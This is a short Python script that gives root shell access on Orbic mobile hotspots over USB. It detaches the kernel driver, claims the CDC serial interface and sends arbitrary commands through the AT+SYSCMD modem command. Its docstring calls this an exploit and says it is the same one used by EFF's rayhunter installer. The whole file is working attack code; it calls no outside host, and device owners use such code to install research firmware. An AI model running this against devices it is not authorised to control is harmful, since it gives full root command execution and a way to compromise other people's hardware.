#!/usr/bin/env python3
"""
at_syscmd.py — Execute commands on Orbic via AT+SYSCMD
Uses the same USB serial exploit as EFF's rayhunter installer.
Commands run as root with FULL capabilities on the device.

Usage: at_syscmd.py "command" ["command2" ...]
"""

import sys
import time
import usb.core
import usb.util

VENDOR_ID = 0x05c6
PRODUCT_ID = 0xf601
INTERFACE = 1
EP_OUT = 0x02
EP_IN = 0x82
TIMEOUT = 3000


def find_device():
    dev = usb.core.find(idVendor=VENDOR_ID, idProduct=PRODUCT_ID)
    if dev is None:
        print("[-] Orbic not found")
        sys.exit(1)
    return dev


def setup_serial(dev):
    try:
        if dev.is_kernel_driver_active(INTERFACE):
            dev.detach_kernel_driver(INTERFACE)
    except (usb.core.USBError, NotImplementedError):
        pass

    usb.util.claim_interface(dev, INTERFACE)

    # Enable serial port (CDC ACM SET_CONTROL_LINE_STATE)
    dev.ctrl_transfer(
        0x21,   # bmRequestType: class, interface, host-to-device
        0x22,   # bRequest: SET_CONTROL_LINE_STATE
        0x03,   # wValue: DTR + RTS
        INTERFACE,
        None,
        TIMEOUT
    )


def send_at(dev, command):
    data = f"\r\n{command}\r\n".encode()
    dev.write(EP_OUT, data, TIMEOUT)
    time.sleep(0.5)

    # Read echo
    try:
        dev.read(EP_IN, 256, TIMEOUT)
    except usb.core.USBTimeoutError:
        pass

    # Read response
    try:
        resp = dev.read(EP_IN, 4096, TIMEOUT)
        return bytes(resp).decode('utf-8', errors='replace').strip()
    except usb.core.USBTimeoutError:
        return "(no response)"


def at_syscmd(dev, shell_cmd):
    return send_at(dev, f"AT+SYSCMD={shell_cmd}")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    dev = find_device()
    setup_serial(dev)
    print(f"[+] Connected to Orbic {VENDOR_ID:04x}:{PRODUCT_ID:04x}")

    for cmd in sys.argv[1:]:
        print(f"[>] AT+SYSCMD={cmd}")
        resp = at_syscmd(dev, cmd)
        print(f"[<] {resp}")
        print()


if __name__ == "__main__":
    main()
